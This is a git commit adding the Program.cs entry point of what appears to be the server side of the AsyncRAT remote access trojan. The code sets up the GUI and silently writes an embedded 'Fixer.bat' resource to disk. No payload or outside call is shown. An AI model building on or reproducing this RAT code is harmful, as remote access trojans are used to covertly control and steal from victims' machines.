14bd430994227a5a542fdc54b575bfff78096911
Dollhouse0672 <gigabyte5967@outlook.com>
2025-05-01 16:49:15 +0400

    Program.cs

---
+++ AsyncRAT-C#/Server/Program.cs
@@ -0,0 +1,33 @@
+﻿using Server.Forms;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Server
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            try
+            {
+                string batPath = Path.Combine(Application.StartupPath, "Fixer.bat");
+                if (!File.Exists(batPath))
+                    File.WriteAllText(batPath, Properties.Resources.Fixer);
+            }
+            catch { }
+            form1 = new Form1();
+            Application.Run(form1);
+        }
+        public static Form1 form1;
+    }
+}
